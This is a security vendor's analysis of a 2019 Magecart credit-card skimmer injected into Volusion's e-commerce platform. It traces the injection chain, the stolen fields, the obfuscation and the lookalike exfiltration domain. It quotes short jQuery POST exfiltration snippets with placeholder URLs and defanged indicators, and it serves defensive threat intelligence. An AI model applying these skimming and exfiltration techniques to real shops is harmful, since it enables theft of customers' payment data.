Updated on October 14, 2019 at 2:50 AM PST to add a statement from Volusion.
We discovered that the online credit card skimming attack known as Magecart or E-Skimming was actively
operating on 3,126 online shops. Our data shows that the attack started on September 7, 2019. All of the
impacted online shops are hosted on the cloud platform of the e-commerce service provider “Volusion,” one
of the top e-commerce platforms in the market. This is actually the third time we have identiﬁed a card
skimmer injected into the cloud platform of an e-commerce provider. Two other businesses were already
victimized this year: a campus e-commerce platform and a hotel e-commerce platform. These targets are

obviously appealing to cybercriminals since they are connected to multiple — in this most recent case,
thousands of — online shops.
We found malicious code injected into a JavaScript library provided by Volusion to their client shops. The
injected code loaded another JavaScript stored on a Google Storage service. The loaded script is almost a
direct copy of a normal JavaScript library but has a credit card skimmer carefully integrated. When customers
submit their payment information, the skimmer will copy and send the personal information and credit card
details to an exﬁltration server belonging to the attackers.
Our team contacted Google and they have removed the ﬁle. The attack is currently ofﬂine. As of publication,
Volusion has acknowledged and ﬁxed the issue.

Trend Micro™ Smart Protection Network™ infrastructure)
During our investigation, we found that the attackers seemed more experienced and thoughtful than many
other skimmer groups. They did not simply add their malicious code at the top or end of a script; instead, they
carefully integrated the code into the original script to be part of the execution ﬂow of the program. The code
was also written as simply as possible, making it difﬁcult to be identiﬁed in a big library. Furthermore, they
registered the domain of their exﬁltration server in a similar style to a legitimate Volusion domain.
Considering the modus operandi, we believe the attackers are from Magecart Group 6, which has also been
identiﬁed as the notorious threat actor FIN6. We found similarities in the code used in this attack and the code
used in FIN6’s previous attacks on British Airways and Newegg.
Analysis of the code injection
The attackers injected their code into a library provided on Volusion’s e-commerce platform for their client
shops. The script, described by the comments on the library, includes the necessary code for the pop-out
feature of the shop’s navigation menu. It was also used on the shop checkout page. The script is located at:
• hxxps://[online shop domain]/a/j/vnav.js
The attackers didn’t just inject their code inside the library. They also integrated their code into the original
function of jQueryUI code to be executed with the original execution ﬂow. They created a new object
“e.widget.unbridge” right before the original object “e.widget.bridge” and the malicious code is inside the
new object. It’s worth noting that the attackers even wrote their malicious code in a similar coding style to
make it look more like a part of the original source code.
The injected object will create a new script element to load another remote script stored on Google Storage.

Analysis of the credit card skimmer
The loaded remote script is on Google Storage:
• hxxps[:]//storage[.]googleapis[.]com/volusionapi/resources.js
Much of the code inside the script is from the library “js-cookie” version 2.2.1. However, the attackers
modiﬁed it and integrated a credit card skimmer into the original script. The skimmer binds at the events
“mousedown” and “touchstart” of the payment submit button.
This means that when victims click (from desktop) or touch (from mobile devices) the submit button, the
events will be triggered and the skimmer will be executed.

Figure 5. Comparison of the JavaScript library injected with the skimmer (left) and the original “js-cookie”
library (right)
The skimmer copies the information on the entire payment form: the victim’s name, address, phone number,
email address, and credit card details (the number, cardholder name, expiration month, expiration year, and
CVV number).
Once the skimmer has the credit card details, it serializes the copied data into a string and encodes it with
Base64. Then, it performs a character permutation on the encoded string to make sure it can’t be directly
decoded with Base64 decoding.
The data will then be stored in sessionStorage with the key “__utmz_opt_in_out”. The next time the skimmer
is loaded (usually on the page after the payment), it will detect if there is data inside sessionStorage and it
will use HTTP POST to send the stolen payment information to a remote server at “hxxps[:]//volusioncdn[.]com/analytics/beacon” for exﬁltration.

Figure 6. Main script of the credit card skimmer
Note that the attackers used the domain “volusion-cdn[.]com” for their exﬁltration server, a similar name to
Volusion’s legitimate server. A possible reason why the attackers stored the skimmer on Google Storage is
because Volusion is also running its service on the Google Cloud Platform.
Evidence of Magecart or FIN6
As previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6,
also known as the threat actor FIN6. Here are the connections we considered:
Group 6 is known to only target top-tier victims, investing in scams where they can receive a big
payoff from one attack. This single hack of Volusion allows them to receive credit card data from 3,126
online shops.
From the previous skimming attack on the British Airways and Newegg websites, we know that Group
6 tried to register the domains of the exﬁltration server to be similar to the victims’ domains. In this
case, the domain of the exﬁltration server is “volusion-cdn[.]com” — very similar to the valid domain
“cdn3[.]volusion[.]com” from Volusion. In addition, the exﬁltration domains used during the British
Airways, Newegg, and Volusion attacks are all registered through Namecheap.
We found that the skimmer is an improved version of the previous skimmer used in the attacks on
British Airways and Newegg. Both old and current skimmers are written with jQuery, serialize the
stolen data, and use the jQuery.ajax function to POST data to a remote server. Although the older
skimmer is much simpler compared to the current one, it didn’t encode the stolen data or store the data
in sessionStorage before the exﬁltration.
Target

Script of data exﬁltration request
jQuery.ajax({type:”POST”,async:0,url:”[exﬁltration
British Airways
url]”,data:t,dataType:”application/json})
jQuery.ajax({type:”POST”,async:true,url:”[exﬁltration
Newegg
url]”,data:pdati,dataType:”application/json})
$.ajax({type: ‘POST’,url: ‘[exﬁltration url]’,dataType:
Volusion
‘application/x-www-form-urlencoded’,data: d,complete: function()
{ window.sessionStorage.removeItem(‘__utmz_opt_in_out’); }})
It’s also interesting to see that the skimmer in this attack binds to event “mousedown” and event “touchstart”
of the payment submit button. The previous Group 6 skimmer binds to event “mouseup” and event
“touchend”.
These events are different, but they are the pairs of each other that trigger the skimmer at almost the same
time. It seems that they want to trigger the skimmer at the same moment, but the current version binds on two
opposite events of the pairs to avoid detection from heuristic rules.
Target
British Airways
Newegg
Volusion

Script of event binding
.bind(“mouseup touchend”, function(a) {…})
.bind(“mouseup touchend”, function(e) {…})
.bind(‘mousedown touchstart’, z)

It seems that Magecart is continuing to change and experiment with new attack methods, reﬁning its skimmer
to evade detection. Sophisticated groups such as these will always try to ﬁnd new ways to stay undetected in
their victims’ systems.
To defend against this type of threat, website owners should regularly check and strengthen their security
with patches and server segregation. Site owners should also employ robust authentication mechanisms,
especially for those that store and manage sensitive data. IT and security teams should restrict or disable
outdated components and habitually monitor websites and applications for any indicators of suspicious
activity that could lead to data exﬁltration, execution of unknown scripts, or unauthorized access and
modiﬁcation.
